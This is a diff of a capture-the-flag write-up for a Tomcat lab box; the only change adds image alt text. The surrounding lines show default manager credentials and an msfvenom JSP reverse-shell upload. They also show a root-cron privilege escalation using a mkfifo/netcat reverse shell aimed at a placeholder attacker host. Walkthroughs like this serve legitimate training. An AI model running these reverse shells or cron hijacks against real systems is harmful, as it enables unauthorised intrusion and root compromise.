@@ -34,13 +34,13 @@ nmap -A -p- TARGET -oN thompson.nmap --min-rate 10000
 | 8009     | ajp13       | Apache Jserv (Protocol v1.3)    |
 | 8080     | http        | Apache Tomcat 8.5.5             |
 
-![](https://cdn.ziomsec.com/thompson/1.webp)
+![performing an nmap scan on thompson](https://cdn.ziomsec.com/thompson/1.webp)
 
 ## Initial Foothold
 
 I accessed the web application running on port 8080 through my web browser.
 
-![](https://cdn.ziomsec.com/thompson/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/thompson/2.webp)
 
 The ajp page was inaccessible. I searched online and found an article on AJP on **hacktricks**.
 - https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp
@@ -51,25 +51,25 @@ I brute forced directories on the web application using **ffuf** to increase my 
 ffuf -u http://TARGET:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 ```
 
-![](https://cdn.ziomsec.com/thompson/3.webp)
+![fuzzing for hidden directories with ffuf](https://cdn.ziomsec.com/thompson/3.webp)
 
 I then accessed the newly discovered endpoints and found a login panel at `/manager/` and `/host-manager`
 
-![](https://cdn.ziomsec.com/thompson/4.webp)
+![attempting to access the tomcat manager](https://cdn.ziomsec.com/thompson/4.webp)
 
 I then tried logging in with default credentials *admin:admin*. The authentication failed, however, I got a valid username and password for the login panel.
 
-![](https://cdn.ziomsec.com/thompson/5.webp)
+![getting a valid login credential](https://cdn.ziomsec.com/thompson/5.webp)
 
 Hence I logged in using those credentials : `tomcat | s3cret`. I got access to the manager panel. This seemed to control the pages present on the web app.
 
-![](https://cdn.ziomsec.com/thompson/6.webp)
+![accessing the tomcat manager](https://cdn.ziomsec.com/thompson/6.webp)
 
 I was also allowed to upload my own code for a page.
 
-![](https://cdn.ziomsec.com/thompson/7.webp)
+![file upload functionality](https://cdn.ziomsec.com/thompson/7.webp)
 
-![](https://cdn.ziomsec.com/thompson/8.webp)
+![file upload functionality](https://cdn.ziomsec.com/thompson/8.webp)
 
 I searched online and found a way to get an RCE from this manager on **hacktricks**.
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
@@ -80,9 +80,9 @@ I generated an **msfvenom** payload and uploaded it on the web app.
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=1234 -f ware -o revshell.war
 ```
 
-![](https://cdn.ziomsec.com/thompson/9.webp)
+![generating a reverse shell payload with msfvenom](https://cdn.ziomsec.com/thompson/9.webp)
 
-![](https://cdn.ziomsec.com/thompson/10.webp)
+![uploading the reverse shell payload](https://cdn.ziomsec.com/thompson/10.webp)
 
 Finally, I started a **netcat** listener and executed the payload to receive a reverse shell.
 
@@ -90,7 +90,7 @@ Finally, I started a **netcat** listener and executed the payload to receive a r
 rlwrap nc -lnvp 1234
 ```
 
-![](https://cdn.ziomsec.com/thompson/11.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/thompson/11.webp)
 
 After getting shell access, I captured the user flag from *jack*'s home directory.
 
@@ -98,13 +98,13 @@ After getting shell access, I captured the user flag from *jack*'s home director
 cat /home/jack/user.txt
 ```
 
-![](https://cdn.ziomsec.com/thompson/12.webp)
+![capturing the user flag](https://cdn.ziomsec.com/thompson/12.webp)
 
 ## Privilege Escalation
 
 After getting the user flag, I looked at other files present in the home directory and found a bash script and a txt file. The bash script seemed to execute the **id** command and save the output in the txt file.
 
-![](https://cdn.ziomsec.com/thompson/13.webp)
+![execting the bash script](https://cdn.ziomsec.com/thompson/13.webp)
 
 I viewed the cronjobs and found the bash script was being executed as root user.
 
@@ -112,7 +112,7 @@ I viewed the cronjobs and found the bash script was being executed as root user.
 cat /etc/crontab
 ```
 
-![](https://cdn.ziomsec.com/thompson/14.webp)
+![viewing cronjobs](https://cdn.ziomsec.com/thompson/14.webp)
 
 Hence I visited **revshells** to get a reverse shell payload and added the payload at the end of the bash script.
 - https://www.revshells.com
@@ -121,7 +121,7 @@ Hence I visited **revshells** to get a reverse shell payload and added the paylo
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 9001 >/tmp/f" > id.sh
 ```
 
-![](https://cdn.ziomsec.com/thompson/15.webp)
+![adding a reverse shell payload](https://cdn.ziomsec.com/thompson/15.webp)
 
 I started a **netcat** listener and after a while, received a connection as root user.
 
@@ -135,7 +135,7 @@ Finally, I captured the root flag from the */root* directory.
 cat /root/root.txt
 ```
 
-![](https://cdn.ziomsec.com/thompson/16.webp)
+![capturing the root flag](https://cdn.ziomsec.com/thompson/16.webp)
 
 That's it from my end!
 Happy Hacking :)
